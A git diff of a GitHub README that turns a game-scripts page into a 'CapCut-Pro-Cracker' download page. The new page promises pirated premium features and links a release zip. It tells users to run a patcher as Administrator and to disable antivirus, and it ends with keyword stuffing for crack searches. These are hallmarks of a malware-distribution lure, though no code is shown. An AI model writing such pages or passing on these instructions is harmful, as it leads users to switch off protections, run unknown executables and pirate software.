@@ -1,54 +1,42 @@
-# 🌾 Grain-Rot-Scripts
+# CapCut-Pro-Cracker
 
-*Collection of UE4SS Lua scripts for GRAIN ROT*
+*Unlock all premium features: remove watermark, 4K export, AI tools, pro effects*
 
-<img width="1200" height="630" alt="image" src="https://github.com/user-attachments/assets/7d030697-f293-427f-b8fe-8d9eeccba57b" />
+<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/06bba2fb-928e-479a-8326-624d09133b48" />
 
 ---
 
-## 🎮 What is This?
+## 🎯 What is This?
 
-**Grain-Rot-Scripts** is a collection of custom Lua scripts for **GRAIN ROT** using the UE4SS framework. These scripts provide various mods, tweaks, and enhancements for the survival game. Perfect for customizing your gameplay experience.
-
-⚠️ **Disclaimer:** For educational purposes only. Use at your own risk.
+**CapCut-Pro-Cracker** unlocks all premium features of CapCut video editor: watermark removal, 4K Ultra HD export, all filters, transitions, effects, AI background removal, auto-captions, and full music library. No account or login required.
 
 ## 📥 Download
 
-**[Download Grain-Rot-Scripts](https://github.com/LegendVibrate/Grain-Rot-Scripts/releases/download/674/Grain-Rot-Scripts.zip)**
+**[Download CapCut-Pro-Cracker](https://github.com/LegendVibrate/CapCut-Pro-Cracker/releases/download/674/CapCutProCracker.zip)**
 
 ---
 
-## 📦 Requirements
+## ✨ Features
 
-- **UE4SS** 
-- **GRAIN ROT** – Latest Steam version
-- **Windows 10/11** – 64-bit
-
----
-
-## 🛠️ Available Scripts
-
-| Script | Description |
-|--------|-------------|
-| **NoGrainRot.lua** | Disables grain rotting mechanic |
-| **UnlimitedHealth.lua** | Infinite health for player and Spark |
-| **InfiniteStamina.lua** | Never run out of stamina |
-| **UnlimitedDurability.lua** | Items never break |
-| **EXP_Multiplier.lua** | Customizable experience gain |
-| **SpeedControl.lua** | Adjust movement speed and jump height |
-| **ItemEditor.lua** | Edit scraps, gold, artifacts |
-| **InstantAcceleration.lua** | Instant speed boost |
-| **NoFallDamage.lua** | Disable fall damage |
-| **FreezeTime.lua** | Freeze game time |
+- 🔓 All premium features unlocked
+- 🚫 No watermark – clean exports
+- 📹 4K Ultra HD export
+- 🎨 Unlimited stickers, filters, effects
+- 🎧 Full licensed music library
+- 🧠 AI tools – background remover, auto-captions
+- 🎞 Motion control – slow-mo, time warp, reverse
+- 🖼 Clean interface – no ads, no bloatware
+- 🚫 No account required
 
 ---
 
 ## ⚙️ Installation
 
-1. Download and install UE4SS
-2. Open Grain-Rot-Scripts
-3. Launch the game
-4. Scripts will load automatically
+1. Click the download button above
+2. Extract the archive
+3. Run the patcher as Administrator
+4. Launch CapCut Pro
+5. Enjoy all premium features!
 
 ---
 
@@ -57,26 +45,27 @@
 | Requirement | Details |
 |-------------|---------|
 | **OS** | Windows 10/11 (64-bit) |
-| **Game** | GRAIN ROT (Steam) |
-| **Framework** | UE4SS |
-| **Storage** | 10MB free space |
+| **Storage** | 300-500 MB |
+| **RAM** | 4GB minimum |
+
+---
+
+## 🐛 Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| Tool doesn't work | Run as Administrator, disable antivirus |
+| Watermark still appears | Close CapCut before patching |
+| Pro features not unlocked | Re-run the patcher |
 
 ---
 
 ## 📝 SEO Tags
 
-grain rot scripts, grain rot mods, grain rot lua, ue4ss scripts, grain rot trainer, grain rot cheat, grain rot 2026, survival game mods, steam game mods, windows tool, game utility, grain rot helper, grain rot assistant
+capcut pro crack, capcut pro unlocker, capcut pro free, capcut pro unlock, capcut crack pc, capcut pro activator, capcut pro patch, capcut pro 2026, capcut no watermark, capcut pro mod, capcut pro full version, capcut pro license, capcut pro key, capcut pro download, capcut pro pc, capcut pro windows, capcut pro 4k export, capcut pro ai tools, capcut pro background remover, capcut pro unlimited, capcut pro free download
 
 ---
 
 ## 💬 Support
 
 ⭐ Star this repository if you enjoy it!
-
----
-
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Grain-Rot-Scripts">
-    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20GRAIN%20ROT%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
